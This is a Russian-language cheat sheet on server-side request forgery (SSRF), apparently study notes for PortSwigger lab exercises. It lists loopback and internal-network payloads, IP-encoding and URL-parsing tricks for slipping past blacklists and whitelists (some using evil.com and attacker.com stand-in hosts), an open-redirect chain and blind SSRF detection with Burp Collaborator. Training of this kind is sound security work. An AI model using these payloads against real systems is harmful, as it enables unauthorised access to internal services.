## 📌 1. Что такое SSRF (Server-Side Request Forgery)

SSRF позволяет атакующему заставить серверное приложение отправлять HTTP-запросы в непредусмотренное место. Это может быть:

- **Сам сервер** (через loopback)
- **Внутренние системы** организации (недоступные извне)
- **Внешние системы** (при этом атака будет выглядеть как исходящая от уязвимого сервера)

---

## 🔍 2. Как искать SSRF (поверхность атаки)

Ищи любые места, где приложение использует введённые пользователем данные для формирования запроса к другому ресурсу.

**Основные места для проверки:**

| Место | Пример |
| :--- | :--- |
| **Параметры запроса** | `stockApi=http://...`, `url=`, `path=`, `dest=`, `redirect=` |
| **Заголовки** | `Referer` (часто используется системами аналитики) |
| **Тело запроса (XML/JSON)** | Поля, содержащие URL |
| **Частичные URL** | Когда ты контролируешь только часть пути или хоста |

---

## 🚀 3. Базовые SSRF-атаки

### 3.1. Атака на сам сервер (loopback)

Замени URL в уязвимом параметре на адрес локального интерфейса.

**Полезные нагрузки:**
- http://127.0.0.1/admin
- http://localhost/admin
- http://0/admin
- http://127.1/admin
- http://[::1]/admin

### 3.2. Атака на внутренние системы (back-end)

Сканируй внутренние IP-диапазоны:

| Диапазон | Пример |
| :--- | :--- |
| `192.168.0.0/24` | `http://192.168.0.1/admin` |
| `10.0.0.0/8` | `http://10.0.0.1/admin` |
| `172.16.0.0/12` | `http://172.16.0.1/admin` |

**Инструмент:** Используй **Burp Intruder** для перебора IP-адресов.
- **Payload type:** Numbers
- **From:** 1, **To:** 255, **Step:** 1
- Вставь позицию перебора: `192.168.0.§0§:8080/admin`
- **Анализ:** Ищи ответы с необычным статусом или длиной.

## 🛡️ 4. Обход фильтров (Bypass techniques)

### 4.1. Обход чёрного списка (Blacklist Bypass)

Если заблокированы `127.0.0.1` и `localhost`, используй альтернативные представления:

| Тип | Пример |
| :--- | :--- |
| **Сокращённый IP** | `http://127.1/admin` |
| **Десятичный** | `http://2130706433/admin` |
| **Шестнадцатеричный** | `http://0x7f000001/admin` |
| **Восьмеричный** | `http://017700000001/admin` |
| **IPv6** | `http://[::1]/admin` |
| **С точкой на конце** | `http://localhost./admin` |
| **Свой домен на 127.0.0.1** | `http://spoofed.burpcollaborator.net/admin` |

**Использование URL-кодирования:**
- Закодируй заблокированные слова: `/%2561dmin` (двойное кодирование `a`).
- Вставь табуляцию или перевод строки: `http://%09localhost/admin` (иногда работает).

### 4.2. Обход белого списка (Whitelist Bypass)

Если разрешён только определённый домен (например, `stock.weliketoshop.net`), используй **URL parsing discrepancies**:

| Метод | Пример |
| :--- | :--- |
| **Встроенные учётные данные (`@`)** | `http://stock.weliketoshop.net@127.0.0.1/admin` |
| **Фрагмент (`#`)** | `http://stock.weliketoshop.net#@127.0.0.1/admin` |
| **Поддомен** | `http://stock.weliketoshop.net.attacker.com/admin` |
| **Кодирование `@`** | `http://stock.weliketoshop.net%40evil.com/admin` |

### 4.3. Обход через открытый редирект (Open Redirect Bypass)

Если на разрешённом домене есть открытый редирект, используй его как «мостик».

1.  Найди открытый редирект на разрешённом домене: `/product/nextProduct?path=http://evil.com`.
2.  Используй его в `stockApi`: stockApi=http://weliketoshop.net/product/nextProduct?path=http://192.168.0.68/admin

## 👻 5. Blind SSRF (Слепая SSRF)

Ответ от внутренней системы не возвращается, но запрос уходит. Используй **Out-of-Band (OAST)** методы.

**Инструменты:**
- **Burp Collaborator** — встроенный инструмент для обнаружения внешних взаимодействий.
- **URL Validation Bypass Cheat Sheet** — генерирует пейлоады для обхода валидации.
- **Collaborator Everywhere** — расширение Burp, автоматически вставляющее Collaborator-пейлоады во все параметры.

### 5.1. Обнаружение Blind SSRF

Вставь свой Collaborator-адрес в уязвимый параметр: stockApi=http://ваш_поддомен.oastify.com/<br>
Если в Collaborator появился DNS-запрос, уязвимость подтверждена.

### 5.2. Эксфильтрация данных (Shellshock)

В некоторых случаях можно выполнить команды на внутреннем сервере (например, через Shellshock).

## 🧩 7. Генерация пейлоадов (URL Validation Bypass Cheat Sheet)

Используй интерактивный инструмент PortSwigger:

1.  **Выбери контекст**:
    - **Fully qualified absolute URL** — для параметров запроса.
    - **Only hostname** — для заголовка `Host`.
    - **CORS Origin** — для заголовка `Origin`.
2.  **Настрой параметры**:
    - **Domain Allow List Bypass**: укажи разрешённый и целевой домены.
    - **Loopback Address**: сгенерирует все варианты `127.0.0.1`.
3.  **Выбери кодировки**:
    - **Intruder's Percent Encoding** (включено по умолчанию).
    - **Everything** — кодирует все символы.
    - **Special Chars** — кодирует спецсимволы.
    - **Unicode Escape**.

## 📝 8. Быстрый чек-лист для лабораторий PortSwigger

1.  **Найди уязвимый параметр** (обычно `stockApi`, `url`, `path`).
2.  **Проверь localhost**: `stockApi=http://localhost/admin`.
3.  **Если заблокировано → обходи фильтр**:
    - Чёрный список: `http://127.1/admin`, `http://2130706433/admin`.
    - Белый список: `http://stock.weliketoshop.net@127.0.0.1/admin`.
4.  **Если админка на другом порту**: `http://127.0.0.1:8080/admin`.
5.  **Если не видно ответа (Blind SSRF)** → используй Collaborator.
6.  **Если есть открытый редирект** → используй его как прокси.
7.  **Выполни действие** (например, удали пользователя): `/admin/delete?username=carlos`.
